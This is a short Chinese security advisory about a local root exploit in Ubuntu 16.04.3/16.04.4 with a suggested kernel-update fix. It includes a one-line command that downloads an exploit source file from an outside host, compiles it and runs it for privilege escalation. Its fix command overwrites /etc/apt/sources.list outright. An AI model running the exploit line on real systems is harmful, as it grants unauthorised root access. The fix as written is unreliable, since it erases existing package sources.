# 【漏洞告警】Ubuntu最新版本存在本地提权漏洞（已有POC）及解决方案

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzAxMjk1NTExNw==&mid=2247484264&idx=1&sn=36594f8d33b347176f924cb722b8eecd&chksm=9ba8bfeaacdf36fc48ce5dd5cf15004f9253a488640ab76ad4c31685eb9aee8664c687009311&scene=126&sessionid=1681663879#rd](http://mp.weixin.qq.com/s?__biz=MzAxMjk1NTExNw==&mid=2247484264&idx=1&sn=36594f8d33b347176f924cb722b8eecd&chksm=9ba8bfeaacdf36fc48ce5dd5cf15004f9253a488640ab76ad4c31685eb9aee8664c687009311&scene=126&sessionid=1681663879#rd)

根据下班前安全客同学的报道：https://www.anquanke.com/post/id/101243

  

![](../Images/164b3601828466c97980e4c194e82eb2.png)

  

PoC：https://t.co/vXPrr33S7B

前提条件：

未设置unprivileged\_bpf\_disabled sysctl ，非特权用户就可以利用此漏洞。

  

已知可以测试版本：

ubuntu 16.04.4

ubuntu 16.04.3

  

在非root机器上可以执行：wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned

  

![](../Images/bc050232c40b591bfad8b0e7615f218a.png)

  

  

解决方案：

echo "deb http://archive.ubuntu.com/ubuntu/  xenial-proposed restricted main multiverse universe" > /etc/apt/sources.list && apt update && apt install linux-image-4.4.0-117-generic && reboot

![](../Images/1eaa453e6722230fbac2cdaa370658c0.png)

  

更新内核后需要重新才能生效

  

![](../Images/b4dc45320640ad0664d0e7a216ec6834.png)

再次执行会提示无权限操作！
